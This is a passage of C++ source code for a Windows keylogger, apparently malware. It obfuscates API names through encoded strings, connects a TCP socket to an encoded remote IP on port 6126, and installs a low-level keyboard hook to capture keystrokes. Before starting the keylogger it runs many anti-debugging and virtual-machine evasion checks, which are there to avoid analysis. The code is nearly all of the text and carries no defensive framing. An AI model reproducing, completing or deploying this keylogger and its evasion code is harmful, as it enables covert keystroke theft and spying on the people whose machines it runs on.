    GetModuleHandleW_t pGetModuleHandleW = (GetModuleHandleW_t)GetProcAddressFn(ker_nel_32lld, decodeString(g_et_mod_u_l_o_handelW, sizeof(g_et_mod_u_l_o_handelW) / sizeof(g_et_mod_u_l_o_handelW[0]), big_string, key).c_str());
    WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(
        GetProcAddressFn(pGetModuleHandleW(wide_original_ws_2_32_dl_l.c_str()),
                         decodeString(w_s_a_o, sizeof(w_s_a_o) / sizeof(w_s_a_o[0]), big_string, key).c_str()));
    
    
    WSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0); //*WSASocket
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = reinterpret_cast<u_short(__stdcall *)(u_short)>(htonsFunc)(6126);
    server.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall *)(const char *)>(inetAddr)(
        decodeString(ipaddr_offset, sizeof(ipaddr_offset) / sizeof(ipaddr_offset[0]), big_string, key).c_str());

    if (reinterpret_cast<int(WINAPI *)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF,
                                   LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>(Connectsaw)(
        WSock, reinterpret_cast<const sockaddr *>(&server), sizeof(server), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == 0) { //WSAConnect
        // Install keyboard hook
        
        hKeyHook = reinterpret_cast<HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD)>(setWindow_hookE_x)
    (WH_KEYBOARD_LL, KeyboardHook, GetModuleHandle(NULL), 0);

        
        MSG msg;
        while (reinterpret_cast<BOOL(WINAPI*)(LPMSG, HWND, UINT, UINT)>(get_mess_A)(&msg, NULL, 0, 0)) {
    reinterpret_cast<BOOL(WINAPI*)(LPMSG)>(trans_mess)(&msg);
    reinterpret_cast<LRESULT(WINAPI*)(LPMSG)>(dis_patch_mess)(&msg);
}

    }

    // Cleanup
    reinterpret_cast<BOOL(WINAPI*)(HHOOK)>(setWindow_Unhook_Ex)(hKeyHook);

    reinterpret_cast<int(WINAPI*)(SOCKET)>(clo_soc)(WSock);

    reinterpret_cast<void(WINAPI *)(void)>(WsAClo)(); //WSACleanup
}


volatile BOOL g_isDebugged = TRUE;


LONG WINAPI CustomVectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionPointers) {
    if (pExceptionPointers->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        pExceptionPointers->ContextRecord->Rip++;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


bool checkAdvancedDebugger()
{
    g_isDebugged = TRUE;

    __try {
        DebugBreak();
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        g_isDebugged = FALSE;
    }

    __try {
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, NULL);
    }
    __except (GetExceptionCode() == EXCEPTION_BREAKPOINT ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
        g_isDebugged = FALSE;
    }

    PVOID vehHandler = AddVectoredExceptionHandler(1, CustomVectoredExceptionHandler);

    __try {
        RaiseException(EXCEPTION_ILLEGAL_INSTRUCTION, 0, 0, NULL);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("ec\n");
    }

    RemoveVectoredExceptionHandler(vehHandler);

    if (g_isDebugged) {
        printf("Debugger detected through advanced exception handling\n");
        return false;
    }

    printf("No debugger detected through advanced exception handling\n");
    return true;
}

bool isSafeEnvironment()
{
    return checkSystemResources() && CheckHDDName() && CheckApplicationName() &&
           CheckParentProcess() && CheckSuspiciousProcesses() && 
           IsVirtualEnvUserInteraction(30, 5) && checkForInternalFile() && 
           checkSuspiciousImport() && checkSufficientProcesses() && checkSufficientUptime() && 
           checkNotBeingDebugged() && checkNoDebugPort() && checkNtGlobalFlag() &&
           checkHeapFlags() && checkDebugArtifacts() && 
           checkDebugRegisters() && CheckRecentFiles() && checkAdvancedDebugger();

}

int main() {
    if (!isSafeEnvironment())
    {
        printf("Virtual environment or insufficient resources detected.\n");
        Sleep(15000);
        return 1;
    }

    initializeKeylogger();
    return 0;
}


